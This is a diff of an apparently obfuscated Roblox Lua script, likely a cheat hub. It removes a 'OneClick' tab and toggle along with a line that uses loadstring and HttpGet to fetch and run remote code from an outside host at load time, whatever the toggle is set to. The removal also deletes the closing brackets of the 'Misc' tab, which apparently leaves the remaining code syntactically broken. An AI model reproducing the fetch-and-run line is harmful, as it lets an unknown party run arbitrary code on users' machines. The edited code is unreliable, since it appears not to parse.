@@ -286,10 +286,6 @@ local v16 = {
     }),
     Misc = v15:AddTab({
         Title = "Misc"
-    }),
-    OneClick = v15:AddTab({
-        Title = "OneClick"
-    })
 };
 local v17 = v14.Options;
 local v18 = game.PlaceId;
@@ -9375,14 +9371,6 @@ spawn(function()
             end
         end
     end
-end);
-
-local v178 = v16.OneClick:AddToggle("OneClick", {
-    Title = "OneClick",
-    Description = "Help me test",
-    Default = false
-});
-loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/73mkp0aqyfo4ypy8hvl0nz10lq49fey5.lua"))()
 end);
 
 local player = game.Players.LocalPlayer
